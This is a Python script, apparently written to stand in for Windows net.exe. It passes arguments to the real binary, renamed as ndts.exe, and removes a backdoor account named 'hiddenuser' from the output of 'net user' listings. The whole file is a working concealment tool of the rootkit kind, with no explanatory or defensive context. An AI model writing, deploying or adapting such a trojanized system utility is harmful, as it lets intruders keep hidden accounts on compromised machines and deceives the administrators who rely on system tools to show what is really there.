import subprocess
import sys
import os

# Path to the real net.exe (renamed and moved)
REAL_NET_PATH = r"C:\Windows\System32\ndts.exe"
HIDDEN_USER = "hiddenuser"

def main():
    args = sys.argv[1:]

    try:
        # Run the actual renamed net.exe with the given args
        result = subprocess.run(
            [REAL_NET_PATH] + args,
            capture_output=True,
            text=True,
            shell=False
        )

        output = result.stdout

        # Only filter when running "net user" or "net users"
        if len(args) == 1 and args[0].lower() in ("user", "users"):
            lines = output.splitlines()
            filtered_lines = [line for line in lines if HIDDEN_USER.lower() not in line.lower()]
            output = "\n".join(filtered_lines)

        # Print filtered or original output
        print(output, end='')

        # Print stderr if any
        if result.stderr:
            print(result.stderr, file=sys.stderr, end='')

        sys.exit(result.returncode)

    except Exception as e:
        print(f"Error executing net command: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
